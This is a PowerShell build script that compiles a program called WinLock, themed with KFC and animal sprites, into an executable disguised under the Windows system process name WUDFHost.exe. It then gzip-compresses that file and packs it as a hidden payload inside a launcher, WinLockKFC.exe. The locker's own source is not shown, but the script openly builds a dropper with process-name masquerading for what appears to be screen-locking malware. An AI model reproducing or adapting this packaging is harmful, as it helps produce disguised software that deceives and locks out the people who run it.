$ErrorActionPreference = "Stop"
Set-Location -LiteralPath $PSScriptRoot
Add-Type -AssemblyName System.IO.Compression

$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (-not (Test-Path $csc)) { throw "csc.exe not found: $csc" }

$rc = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin" -Recurse -Filter rc.exe -ErrorAction SilentlyContinue |
    Where-Object { $_.FullName -match '\\x64\\rc\.exe$' } |
    Sort-Object FullName -Descending |
    Select-Object -First 1 -ExpandProperty FullName
if (-not $rc) { throw "rc.exe not found (Windows SDK x64)" }

$refCandidates = @(
    "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8",
    "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.7.2",
    "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.6.1"
)
$ref = $refCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
if (-not $ref) { throw "No .NET Framework 4.x reference assemblies found" }

function Compile-Resource($rcPath, $scriptPath, $outputPath) {
    & $rcPath /nologo /fo $outputPath $scriptPath
    if ($LASTEXITCODE -ne 0) { throw "rc failed for $scriptPath (exit $LASTEXITCODE)" }
}

Write-Host "Building payload..."
Compile-Resource $rc "payload.rc" "payload.res"

$payloadResources = @(
    "/resource:kfc_sprite.png,kfc.png",
    "/resource:cat_sprite.png,cat.png",
    "/resource:chicken_sprite.png,chicken.png",
    "/resource:wing.png,wing.png"
)

# Audio is optional: the music track is not shipped in the repository.
foreach ($audio in @(
    "music.mp3",
    "cue_glass.mp3",
    "cue_heartbeat.mp3",
    "cue_fanfare.mp3",
    "cue_crunch.mp3",
    "cue_achievement.mp3"
)) {
    if (Test-Path -LiteralPath $audio) {
        $payloadResources += "/resource:$audio,$audio"
    }
}

if (Test-Path ".\sfx") {
    foreach ($sfx in Get-ChildItem ".\sfx" -Filter "*.mp3" -File | Sort-Object Name) {
        $payloadResources += "/resource:sfx\$($sfx.Name),$($sfx.Name)"
    }
}
if (Test-Path ".\music_loud.mp3") {
    $payloadResources += "/resource:music_loud.mp3,music_loud.mp3"
}

$payloadArgs = @(
    "/nologo",
    "/target:winexe",
    "/platform:anycpu",
    "/optimize+",
    "/codepage:65001",
    "/out:WUDFHost.exe",
    "/win32res:payload.res",
    "/r:$ref\System.Xaml.dll",
    "/r:$ref\PresentationCore.dll",
    "/r:$ref\PresentationFramework.dll",
    "/r:$ref\WindowsBase.dll",
    "WinLock.cs"
) + $payloadResources

& $csc @payloadArgs
if ($LASTEXITCODE -ne 0) { throw "Payload build failed, exit code: $LASTEXITCODE" }

Write-Host "Compressing payload..."
$payloadBytes = [System.IO.File]::ReadAllBytes((Join-Path $PSScriptRoot "WUDFHost.exe"))
$gzipPath = Join-Path $PSScriptRoot "payload.gz"
$gzipStream = New-Object System.IO.FileStream($gzipPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
$compressor = New-Object System.IO.Compression.GZipStream($gzipStream, [System.IO.Compression.CompressionMode]::Compress)
$compressor.Write($payloadBytes, 0, $payloadBytes.Length)
$compressor.Close()
$gzipStream.Close()

Write-Host "Building launcher..."
Compile-Resource $rc "launcher.rc" "launcher.res"

$launcherArgs = @(
    "/nologo",
    "/target:winexe",
    "/platform:anycpu",
    "/optimize+",
    "/codepage:65001",
    "/out:WinLockKFC.exe",
    "/win32res:launcher.res",
    "/resource:payload.gz,payload.gz",
    "Launcher.cs"
)

& $csc @launcherArgs
if ($LASTEXITCODE -ne 0) { throw "Launcher build failed, exit code: $LASTEXITCODE" }

Write-Host "OK: WinLockKFC.exe"
